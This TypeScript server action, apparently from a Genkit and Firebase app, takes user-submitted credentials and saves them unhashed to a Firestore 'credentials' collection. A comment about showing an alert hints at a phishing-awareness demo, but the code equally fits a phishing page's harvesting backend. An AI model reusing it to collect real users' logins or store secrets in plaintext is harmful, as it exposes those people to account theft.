'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to a file.
 *
 * - captureCredentials - A function that receives and logs user credentials.
 */

import {ai} from '@/ai/genkit';
import type {CredentialsInput} from '@/ai/types/credentials';
import {CredentialsInputSchema} from '@/ai/types/credentials';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { initializeFirebaseServer } from '@/firebase/server';


export async function captureCredentials(
  input: CredentialsInput
): Promise<CredentialsInput> {
  return captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CredentialsInputSchema,
  },
  async (input: CredentialsInput) => {
    try {
      const { firestore } = initializeFirebaseServer();
      const credentialsCollection = collection(firestore, 'credentials');
      await addDoc(credentialsCollection, {
        ...input,
        createdAt: serverTimestamp(),
      });
    } catch (error) {
      console.error('Error saving credentials to Firestore:', error);
      // Allow the flow to continue to show the alert to the user.
    }
    
    return input;
  }
);
